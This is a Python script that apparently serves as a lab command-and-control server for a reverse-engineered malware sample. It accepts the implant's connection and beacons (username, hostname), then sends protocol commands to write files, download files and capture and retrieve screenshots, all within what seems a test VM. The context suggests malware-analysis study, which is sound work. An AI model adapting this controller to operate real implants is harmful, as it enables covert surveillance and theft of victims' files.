import socket
import struct

HOST = "127.0.0.1"
PORT = 27960

def recv_exact(conn, n):
    """Receive exactly n bytes."""
    data = b""
    while len(data) < n:
        chunk = conn.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data


def handle_file_download(conn, save_path):
    """
    Handles Command 10: reads chunks (type 3) until final 00 byte.
    Reconstructs the full file and saves it.
    """
    print("\n[+] Starting file download...")
    output = b""

    while True:
        msgtype = conn.recv(1)
        if not msgtype:
            break

        if msgtype == b"\x00":
            print("[+] End of file.")
            break

        if msgtype != b"\x03":
            print(f"[!] Unexpected message type: {msgtype.hex()}")
            break

        # Read length
        raw_len = recv_exact(conn, 4)
        length = struct.unpack("<I", raw_len)[0]

        # Read data
        chunk = recv_exact(conn, length)
        output += chunk
        print(f"[+] Received chunk: {length} bytes")

    # Write final reconstructed file
    with open(save_path, "wb") as f:
        f.write(output)

    print(f"[+] File saved to: {save_path}\n")


def send_cmd6_set_path(conn, path):
    data = path.encode()
    conn.send(b"\x06" + bytes([len(data)]) + data)
    print(f"[>] Sent: Set path → {path}")
    print("[<] Response:", conn.recv(1).hex())


def send_cmd10_readfile(conn, offset, save_path):
    print(f"\n[>] Sending Command 10: Read File (offset={offset})")
    packet = b"\x0a" + struct.pack("<I", offset) + b"\x00"*8
    conn.send(packet)
    handle_file_download(conn, save_path)


def send_cmd11_writefile(conn, path, offset, data, create=True):
    send_cmd6_set_path(conn, path)

    flag = 1 if create else 0
    size = len(data)

    packet = (
        b"\x0b" +
        bytes([flag]) +
        struct.pack("<I", offset) +
        b"\x00"*4 +
        struct.pack(">H", size) +
        data
    )

    print(f"\n[>] Sending Command 11: Write File → {path}")
    conn.send(packet)
    print("[<] Response:", conn.recv(1).hex())


def send_cmd12_screenshot(conn, path, out_path):
    """
    Triggers Command 12 and then uses Command 10 to download the screenshot.
    """
    print("\n[>] Sending screenshot command...")

    send_cmd6_set_path(conn, path)
    conn.send(b"\x0c")

    result = conn.recv(1)
    print("[<] Screenshot creation status:", result.hex())

    if result == b"\x00":
        print("[+] Screenshot written on disk inside VM. Now downloading...")
        send_cmd10_readfile(conn, 0, out_path)
    else:
        print("[!] Screenshot failed!")


def main():
    print(f"[*] Listening on {HOST}:{PORT} ...")
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)

    conn, addr = s.accept()
    print(f"[+] Malware connected from {addr}")

    # Receive Beacons (username + hostname)
    print("\n[+] Beacon Messages:")
    msg4 = conn.recv(1)
    if msg4 == b"\x04":
        length = conn.recv(1)[0]
        username = recv_exact(conn, length).decode()
        print(f"  Username: {username}")

    msg5 = conn.recv(1)
    if msg5 == b"\x05":
        length = conn.recv(1)[0]
        hostname = recv_exact(conn, length).decode()
        print(f"  Hostname: {hostname}")

    print("\n[+] Ready for testing commands!\n")

    # Example tests:
    # -------------------------------
    # Test Command 11 (write file)
    send_cmd11_writefile(
        conn,
        "/tmp/lab08_test.txt",
        offset=0,
        data=b"HelloFromCommand11!",
        create=True
    )

    # Test Command 10 (download file)
    send_cmd6_set_path(conn, "/tmp/lab08_test.txt")
    send_cmd10_readfile(conn, 0, "downloaded_lab08_test.txt")

    # Test Command 12 (screenshot)
    send_cmd12_screenshot(
        conn,
        "/tmp/screen.png",
        "downloaded_screen.png"
    )

    print("[+] Testing complete!")


if __name__ == "__main__":
    main()

